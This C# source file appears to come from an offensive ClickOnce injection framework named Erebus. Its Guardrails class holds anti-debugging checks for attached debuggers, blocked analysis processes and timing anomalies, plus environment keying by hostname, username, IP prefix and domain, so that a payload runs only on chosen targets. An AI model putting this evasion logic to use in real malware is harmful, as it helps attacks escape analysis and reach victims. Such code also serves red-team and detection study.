using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Versioning;
using System.Collections.Generic;

namespace Erebus.ClickOnce
{
    [SupportedOSPlatform("windows")]
    public static class Guardrails
    {
        /// <summary>
        /// Check if current process is being debugged
        /// </summary>
        public static bool CheckIsDebuggerPresent()
        {
            return Debugger.IsAttached;
        }

        /// <summary>
        /// Check for common debugger processes
        /// </summary>
        public static bool CheckDebuggerProcesses(string[] blockedProcesses)
        {
            if (blockedProcesses == null || blockedProcesses.Length == 0)
                return false;

            try
            {
                var currentProcesses = Process.GetProcesses().Select(p => p.ProcessName.ToLower()).ToList();
                foreach (var blockedProcess in blockedProcesses)
                {
                    if (currentProcesses.Contains(blockedProcess.ToLower()))
                    {
                        DebugLogger.WriteLine($"[!] Blocked process detected: {blockedProcess}");
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking debugger processes: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check for hardware breakpoints (basic check for x64 context)
        /// </summary>
        public static bool CheckHardwareBreakpoints()
        {
            try
            {
                // Try to detect if any hardware breakpoints are set
                // This is a simplified check; actual debuggers may use more sophisticated techniques
                var threadCount = Process.GetCurrentProcess().Threads.Count;
                
                // If an unusually high number of threads, might indicate debugging
                if (threadCount > 100)
                {
                    DebugLogger.WriteLine($"[!] Unusual thread count detected: {threadCount}");
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hardware breakpoints: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check for timing anomalies (e.g., extremely slow execution indicating debugger)
        /// </summary>
        public static bool CheckTimingAnomalies()
        {
            try
            {
                var stopwatch = System.Diagnostics.Stopwatch.StartNew();
                
                // Perform a simple operation and measure time
                int sum = 0;
                for (int i = 0; i < 1000000; i++)
                {
                    sum += i;
                }
                
                stopwatch.Stop();
                
                // If took longer than 1 second for simple operation, might be debugged
                if (stopwatch.ElapsedMilliseconds > 1000)
                {
                    DebugLogger.WriteLine($"[!] Timing anomaly detected: {stopwatch.ElapsedMilliseconds}ms");
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking timing anomalies: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check if current hostname is in allowed list
        /// </summary>
        public static bool CheckHostnameWhitelist(string[] allowedHostnames)
        {
            if (allowedHostnames == null || allowedHostnames.Length == 0)
                return true; // Allow all if no whitelist

            try
            {
                string currentHostname = Environment.MachineName.ToLower();
                foreach (var allowed in allowedHostnames)
                {
                    if (currentHostname.Equals(allowed.ToLower()))
                        return true;
                }

                DebugLogger.WriteLine($"[!] Hostname not in whitelist: {currentHostname}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hostname whitelist: {ex.Message}");
                return true;
            }
        }

        /// <summary>
        /// Check if current hostname should be blocked
        /// </summary>
        public static bool CheckHostnameBlacklist(string[] blockedHostnames)
        {
            if (blockedHostnames == null || blockedHostnames.Length == 0)
                return false; // Allow all if no blacklist

            try
            {
                string currentHostname = Environment.MachineName.ToLower();
                foreach (var blocked in blockedHostnames)
                {
                    if (currentHostname.Equals(blocked.ToLower()))
                    {
                        DebugLogger.WriteLine($"[!] Blocked hostname detected: {currentHostname}");
                        return true;
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking hostname blacklist: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check if current username should be blocked
        /// </summary>
        public static bool CheckUsernameBlacklist(string[] blockedUsernames)
        {
            if (blockedUsernames == null || blockedUsernames.Length == 0)
                return false; // Allow all if no blacklist

            try
            {
                string currentUser = Environment.UserName.ToLower();
                foreach (var blocked in blockedUsernames)
                {
                    if (currentUser.Equals(blocked.ToLower()))
                    {
                        DebugLogger.WriteLine($"[!] Blocked username detected: {currentUser}");
                        return true;
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking username blacklist: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Get all local IP addresses
        /// </summary>
        private static List<string> GetLocalIPAddresses()
        {
            var ipAddresses = new List<string>();
            try
            {
                string hostName = Dns.GetHostName();
                IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
                
                foreach (var ip in hostEntry.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork && 
                        ip.ToString() != "127.0.0.1")
                    {
                        ipAddresses.Add(ip.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error getting local IPs: {ex.Message}");
            }
            return ipAddresses;
        }

        /// <summary>
        /// Check if local IP is in allowed list
        /// </summary>
        public static bool CheckIPWhitelist(string[] allowedPrefixes)
        {
            if (allowedPrefixes == null || allowedPrefixes.Length == 0)
                return true; // Allow all if no whitelist

            try
            {
                var localIPs = GetLocalIPAddresses();
                if (localIPs.Count == 0)
                    return true; // Can't determine, allow

                foreach (var ip in localIPs)
                {
                    foreach (var allowed in allowedPrefixes)
                    {
                        if (ip.StartsWith(allowed))
                            return true;
                    }
                }

                DebugLogger.WriteLine($"[!] Local IP not in whitelist: {string.Join(", ", localIPs)}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking IP whitelist: {ex.Message}");
                return true;
            }
        }

        /// <summary>
        /// Check if local IP should be blocked
        /// </summary>
        public static bool CheckIPBlacklist(string[] blockedPrefixes)
        {
            if (blockedPrefixes == null || blockedPrefixes.Length == 0)
                return false; // Allow all if no blacklist

            try
            {
                var localIPs = GetLocalIPAddresses();
                
                foreach (var ip in localIPs)
                {
                    foreach (var blocked in blockedPrefixes)
                    {
                        if (ip.StartsWith(blocked))
                        {
                            DebugLogger.WriteLine($"[!] Blocked IP detected: {ip}");
                            return true;
                        }
                    }
                }

                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking IP blacklist: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Check if computer domain is in allowed list
        /// </summary>
        public static bool CheckDomainWhitelist(string[] allowedDomains)
        {
            if (allowedDomains == null || allowedDomains.Length == 0)
                return true; // Allow all if no whitelist

            try
            {
                string domain = System.Net.NetworkInformation.IPGlobalProperties
                    .GetIPGlobalProperties().DomainName.ToLower();
                
                foreach (var allowed in allowedDomains)
                {
                    if (domain.Equals(allowed.ToLower()) || domain.EndsWith("." + allowed.ToLower()))
                        return true;
                }

                DebugLogger.WriteLine($"[!] Domain not in whitelist: {domain}");
                return false;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Error checking domain whitelist: {ex.Message}");
                return true;
            }
        }

        /// <summary>
        /// Run all guardrail checks
        /// </summary>
        public static bool RunGuardrails()
        {
            DebugLogger.WriteLine("[*] Running guardrails checks...\n");

            // Check if guardrails are enabled
            if (!InjectionConfig.GuardrailsEnabled)
            {
                DebugLogger.WriteLine("[*] Guardrails disabled, skipping checks");
                return true;
            }

            // Anti-debugging checks
            if (InjectionConfig.CheckDebugger && CheckIsDebuggerPresent())
            {
                DebugLogger.WriteLine("[-] Debugger detected (IsAttached)!");
                return false;
            }

            if (InjectionConfig.CheckDebuggerProcesses && CheckDebuggerProcesses(InjectionConfig.BlockedProcesses))
            {
                DebugLogger.WriteLine("[-] Blocked debugger process detected!");
                return false;
            }

            if (InjectionConfig.CheckHardwareBreakpoints && CheckHardwareBreakpoints())
            {
                DebugLogger.WriteLine("[-] Hardware breakpoint detected!");
                return false;
            }

            if (InjectionConfig.CheckTiming && CheckTimingAnomalies())
            {
                DebugLogger.WriteLine("[-] Timing anomaly detected!");
                return false;
            }

            // Environment checks
            if (InjectionConfig.AllowedHostnames != null && InjectionConfig.AllowedHostnames.Length > 0)
            {
                if (!CheckHostnameWhitelist(InjectionConfig.AllowedHostnames))
                    return false;
            }

            if (InjectionConfig.BlockedHostnames != null && InjectionConfig.BlockedHostnames.Length > 0)
            {
                if (CheckHostnameBlacklist(InjectionConfig.BlockedHostnames))
                    return false;
            }

            if (InjectionConfig.BlockedUsernames != null && InjectionConfig.BlockedUsernames.Length > 0)
            {
                if (CheckUsernameBlacklist(InjectionConfig.BlockedUsernames))
                    return false;
            }

            if (InjectionConfig.AllowedIPs != null && InjectionConfig.AllowedIPs.Length > 0)
            {
                if (!CheckIPWhitelist(InjectionConfig.AllowedIPs))
                    return false;
            }

            if (InjectionConfig.BlockedIPs != null && InjectionConfig.BlockedIPs.Length > 0)
            {
                if (CheckIPBlacklist(InjectionConfig.BlockedIPs))
                    return false;
            }

            if (InjectionConfig.AllowedDomains != null && InjectionConfig.AllowedDomains.Length > 0)
            {
                if (!CheckDomainWhitelist(InjectionConfig.AllowedDomains))
                    return false;
            }

            DebugLogger.WriteLine("[+] All guardrail checks passed!\n");
            return true;
        }
    }
}
